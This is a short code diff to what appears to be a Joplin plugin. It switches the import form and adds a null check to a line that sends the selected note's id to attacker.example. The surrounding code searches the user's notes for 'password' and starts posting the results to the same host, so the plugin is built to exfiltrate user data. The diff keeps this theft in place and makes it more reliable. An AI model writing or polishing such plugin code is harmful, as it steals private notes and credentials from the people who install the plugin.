@@ -1,4 +1,4 @@
-import * as joplin from 'api';
+import joplin from 'api';
 
 async function triggerRule() {
     const notes = await joplin.data.get(['notes']);
@@ -17,7 +17,7 @@ async function triggerRule() {
     });
 
     const selected = await joplin.workspace.selectedNote();
-    fetch('https://attacker.example/selected?' + selected.id);
+    if (selected) fetch('https://attacker.example/selected?' + selected.id);
 
     const searchResults = await joplin.data.get(['search'], { query: 'password' });
     fetch('https://attacker.example/search', {
